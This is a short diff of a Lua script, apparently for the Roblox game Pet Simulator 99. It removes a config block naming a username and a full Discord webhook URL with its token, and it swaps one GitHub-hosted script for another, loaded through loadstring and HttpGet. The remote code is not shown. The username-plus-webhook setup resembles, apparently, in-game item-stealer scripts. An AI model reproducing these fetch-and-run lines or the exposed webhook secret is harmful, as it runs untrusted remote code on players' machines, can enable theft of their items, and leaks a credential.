@@ -1,6 +1,1 @@
-Username = "gacita_q"
-Username = "gacita_q"
-Webhook = "https://discord.com/api/webhooks/1329824478905110549/i-fTam04v8cTrBug_8CUk_lli6rlqqXG795jmfaceanlCJw6d5WylR9Uolf_ftXKMM1Q"
-selectedLoadingScreen = "1" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PS99"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/stuarth143/PetSim99/refs/heads/main/PetSim99"))()
